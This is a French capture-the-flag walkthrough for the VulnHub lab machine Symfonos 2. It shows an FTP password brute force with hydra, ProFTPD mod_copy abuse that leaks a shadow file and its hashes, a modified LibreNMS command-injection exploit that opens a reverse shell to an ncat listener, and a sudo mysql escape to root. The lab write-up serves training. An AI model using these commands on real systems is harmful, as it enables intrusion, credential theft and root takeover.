# Solution du CTF Symfonos #2 de VulnHub

Je continue sur la série des Symfonos avec [symfonos: 2](https://vulnhub.com/entry/symfonos-2,331/).

```
Nmap scan report for 192.168.56.113
Host is up (0.00011s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 9df85f8720e58cfa68477d716208adb9 (RSA)
|   256 042abb0656ead1931cd2780a00469d85 (ECDSA)
|_  256 28adacdc7e2a1cf64c6b47f2d6225b52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:35:5B:CD (Oracle VirtualBox virtual NIC)
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h59m58s, deviation: 3h27m51s, median: 59m57s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2023-02-20T13:43:18
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2023-02-20T07:43:18-06:00
```

Je ne parvient pas à lister les utilisateurs Samba mais il y a un partage exposé :

```shellsession
$ smbclient -U "" -N -L //192.168.56.113

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available
```

Dans ce partage `anonymous` se trouve un fichier `log.txt` qui correspond à une session de shell. En voici une partie :

```shellsession
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
root@symfonos2:~# cat /etc/samba/smb.conf                                                                              
#                                                                                                                      
# Sample configuration file for the Samba suite for Debian GNU/Linux.
--- snip ---
[anonymous]                                                                                                            
   path = /home/aeolus/share                                                                                           
   browseable = yes                                                                                                    
   read only = yes                                                                                                     
   guest ok = yes

root@symfonos2:~# cat /usr/local/etc/proftpd.conf                                                                      
# This is a basic ProFTPD configuration file (rename it to                                                             
# 'proftpd.conf' for actual use.  It establishes a single server                                                       
# and a single anonymous login.  It assumes that you have a user/group                                                 
# "nobody" and "ftp" for normal operation and anon.                                                                    
                                                                                    
# Set the user and group under which the server will run.                                                              
User                aeolus                                                                                             
Group               aeolus

--- snip ---
# A basic anonymous configuration, no upload directories.  If you do not                                               
# want anonymous users, simply delete this entire <Anonymous> section.                                                 
<Anonymous ~ftp>                                                                                                       
  User              ftp                                                                                                
  Group             ftp                                                                                                
                                                                                                                       
  # We want clients to be able to login with "anonymous" as well as "ftp"                                              
  UserAlias         anonymous ftp                                                                                      
                                                                                                                       
  # Limit the maximum number of anonymous logins                                                                       
  MaxClients            10                                                                                             
                                                                                                                       
  # We want 'welcome.msg' displayed at login, and '.message' displayed                                                 
  # in each newly chdired directory.                                                                                   
  #DisplayLogin         welcome.msg                                                                                    
  #DisplayChdir         .message                                                                                       
                                                                                                                       
  # Limit WRITE everywhere in the anonymous chroot                                                                     
  <Limit WRITE>                                                                                                        
    DenyAll                                                                                                            
  </Limit>                                                                                                             
</Anonymous>
```

Je suis parti sur un brute force du compte `aeolus` sur le serveur FTP. Et ça a marché :

```shellsession
$ hydra -l aeolus -P rockyou.txt ftp://192.168.56.113
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-20 14:00:44
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344381 login tries (l:1/p:14344381), ~896524 tries per task
[DATA] attacking ftp://192.168.56.113:21/
[STATUS] 2727.00 tries/min, 2727 tries in 00:01h, 14341654 to do in 87:40h, 16 active
[STATUS] 2736.00 tries/min, 8208 tries in 00:03h, 14336173 to do in 87:20h, 16 active
[STATUS] 2743.57 tries/min, 19205 tries in 00:07h, 14325176 to do in 87:02h, 16 active
[21][ftp] host: 192.168.56.113   login: aeolus   password: sergioteamo
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-20 14:09:53
```

A noter que pendant ce temps j'ai énuméré le serveur `WebFS` sans succès. Il y avait peut de chances de trouver quelque chose car un serveur méconnu comme celui-ci a sans doute des fonctionalités très limitées.

A tout hasard j'ai cherché des vulnérabilités existantes pour la version de `ProFTPD` et je n'ai pas été déçu : [ProFTPd 1.3.5 - File Copy - Linux remote Exploit](https://www.exploit-db.com/exploits/36742)

Cette version a un module `mod_copy` qui permet de copier un fichier du serveur vers un autre emplacement local et visiblement sans grandes vérifications.

Je vais donc copier la sauvegarde du fichier `shadow` vers le path exposé par le SMB :

```shellsession
$ ncat 192.168.56.113 21 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.113:21.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.56.113]
site cpfr /var/backups/shadow.bak
350 File or directory exists, ready for destination name
site cpto /home/aeolus/share/yolo.txt
250 Copy successful
QUIT
221 Goodbye.
```

Je peux alors récupérer le fichier via `smbclient` comme précédemment (`smbclient -U "" -N //192.168.56.113/anonymous`). Voici son contenu :

```
root:$6$VTftENaZ$ggY84BSFETwhissv0N6mt2VaQN9k6/HzwwmTtVkDtTbCbqofFO8MVW.IcOKIzuI07m36uy9.565qelr/beHer.:18095:0:99999:7:::
daemon:*:18095:0:99999:7:::
bin:*:18095:0:99999:7:::
sys:*:18095:0:99999:7:::
sync:*:18095:0:99999:7:::
games:*:18095:0:99999:7:::
man:*:18095:0:99999:7:::
lp:*:18095:0:99999:7:::
mail:*:18095:0:99999:7:::
news:*:18095:0:99999:7:::
uucp:*:18095:0:99999:7:::
proxy:*:18095:0:99999:7:::
www-data:*:18095:0:99999:7:::
backup:*:18095:0:99999:7:::
list:*:18095:0:99999:7:::
irc:*:18095:0:99999:7:::
gnats:*:18095:0:99999:7:::
nobody:*:18095:0:99999:7:::
systemd-timesync:*:18095:0:99999:7:::
systemd-network:*:18095:0:99999:7:::
systemd-resolve:*:18095:0:99999:7:::
systemd-bus-proxy:*:18095:0:99999:7:::
_apt:*:18095:0:99999:7:::
Debian-exim:!:18095:0:99999:7:::
messagebus:*:18095:0:99999:7:::
sshd:*:18095:0:99999:7:::
aeolus:$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:18095:0:99999:7:::
cronus:$6$wOmUfiZO$WajhRWpZyuHbjAbtPDQnR3oVQeEKtZtYYElWomv9xZLOhz7ALkHUT2Wp6cFFg1uLCq49SYel5goXroJ0SxU3D/:18095:0:99999:7:::
mysql:!:18095:0:99999:7:::
Debian-snmp:!:18095:0:99999:7:::
librenms:!:18095::::::
```

Le hash de `aeolus` correspond bien au mot de passe que l'on a déjà cassé.

On peut utiliser ce compte pour se connecter via SSH.

On découvre une fois connecté qu'un procesuss Apache tourne avec les droits de l'utilisateur `cronus` :

`uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)`

Et il semble que le `DocumentRoot` du serveur web correspond au dossier `/opt/librenms/` qui est géré par l'utilisateur `librenms` et les membres du groupe éponyme :

```
drwxrwx--- 26 librenms librenms 4.0K Jul 18  2019 librenms
```

Comme on ne peut pas lire les fichiers on va forwarder le port en écoute 8080 pour y accéder :

```bash
ssh -N -L 8080:127.0.0.1:8080 aeolus@192.168.56.113
```

On tombe alors sur une mire `LibreNMS`. Ce logiciel se présente comme cela sur Github :

> LibreNMS is an auto-discovering PHP/MySQL/SNMP based network monitoring which includes support for a wide range of network hardware and operating systems including Cisco, Linux, FreeBSD, Juniper, Brocade, Foundry, HP and many more.

Les identifiants `aeolus` permettent de s'y connecter. Je ne trouve rien permettant d'exécuter des commandes ou d'uploader un fichier mais il y a un exploit pour ce qui semble être une injection de commande :

[LibreNMS 1.46 - addhost Remote Code Execution - PHP webapps Exploit](https://www.exploit-db.com/exploits/47044)

L'exploit n'est pas très avancé, notamment il requiert qu'on lui passe les cookies en argument au lieu de faire l'authentification lui-même.

Il gère aussi mal le découpage des cookies quand le caractère égal est présent dans la valeur du cookie. J'ai du rectifier la partie qui gère ça :

```python
# request cookies
cookies = {}
for cookie in raw_cookies.split(";"):
    cookie = cookie.strip()
    if cookie:
        # print cookie
        c = cookie.split("=", 1)
        cookies[c[0]] = c[1]
```

Après ça fonctionne (j'ai mis tous les cookies mais peut être que le `PHPSESSID` suffirait) :

```shellsession
$ python 47044.py http://127.0.0.1:8080/ "XSRF-TOKEN=eyJpdiI6ImRUbjN2NEt2YjA4Mk1hbXJBK0N5VlE9PSIsInZhbHVlIjoiVm9cL01Ba0dyYTN6MHlhbjdoVWJxK1RPcHZOWHFPUXhPYUF4V3VWZ3FRV2FiMnNpYjRPMkp1b0tXa2FsSHdtT1M0U0NPcWQxUzl0MHFZTWNoaERJbFNnPT0iLCJtYWMiOiJjMzcxMzUyOWFiZTRhOTZiZjU5Mjc4MjAxNWJlYWIwNDkyMTkyOWZjYzJlOGIwYWQyODcxNmNhMGNmMzU0ZDBiIn0=; librenms_session=eyJpdiI6Ild3UWVVM0VESERieWlQdmorNElPOGc9PSIsInZhbHVlIjoiMFhIenc2UThGWVFXSWU5cnlTMFR3VkFnTytpckVxSzVEbE0yeU1Fa1p2VlQxQ2hqMjA0d2hDNDhIT3VZZytDY1ZIRFVvOFJ3ZENpc21RaFh1SGxydWc9PSIsIm1hYyI6IjU5MzlhNDhiMzgyMjBjYjY0OTc4YWVkN2ZmOWM3ZTI4OGQ0OTUxOWZhYWE2OTliYmI0Mjc5ZWVkOGUyNTFkYWUifQ==; PHPSESSID=g4pm7kq5bqg0vu8lb08mvilmu7;" 192.168.56.1 9999
[+] Device Created Sucssfully
```

Il faut avoir préalablement mis en écoute un `Ncat` :

```shellsession
$ ncat -l -p 9999 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.56.113.
Ncat: Connection from 192.168.56.113:41036.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)
```

Depuis ce compte on veut exécuter une commande avec les droits root :

```shellsession
cronus@symfonos2:~$ sudo -l
Matching Defaults entries for cronus on symfonos2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql
```

Une fonctionnalité du client `mysql` permet d'appeler une commande du shell :

```shellsession
cronus@symfonos2:~$ sudo /usr/bin/mysql
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 31
Server version: 10.1.38-MariaDB-0+deb9u1 Debian 9.8

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> \! /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
proof.txt
# cat proof.txt

        Congrats on rooting symfonos:2!

           ,   ,
         ,-`{-`/
      ,-~ , \ {-~~-,
    ,~  ,   ,`,-~~-,`,
  ,`   ,   { {      } }                                             }/
 ;     ,--/`\ \    / /                                     }/      /,/
;  ,-./      \ \  { {  (                                  /,;    ,/ ,/
; /   `       } } `, `-`-.___                            / `,  ,/  `,/
 \|         ,`,`    `~.___,---}                         / ,`,,/  ,`,;
  `        { {                                     __  /  ,`/   ,`,;
        /   \ \                                 _,`, `{  `,{   `,`;`
       {     } }       /~\         .-:::-.     (--,   ;\ `,}  `,`;
       \\._./ /      /` , \      ,:::::::::,     `~;   \},/  `,`;     ,-=-
        `-..-`      /. `  .\_   ;:::::::::::;  __,{     `/  `,`;     {
                   / , ~ . ^ `~`\:::::::::::<<~>-,,`,    `-,  ``,_    }
                /~~ . `  . ~  , .`~~\:::::::;    _-~  ;__,        `,-`
       /`\    /~,  . ~ , '  `  ,  .` \::::;`   <<<~```   ``-,,__   ;
      /` .`\ /` .  ^  ,  ~  ,  . ` . ~\~                       \\, `,__
     / ` , ,`\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   `-`--, \
    / , ~ . ~ \ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            ``
  /` ` . ~ . ` `\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___
/` . `  ,  . ~ , \  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,

        Contact me via Twitter @zayotic to give feedback!
```

*Publié le 20 février 2023*
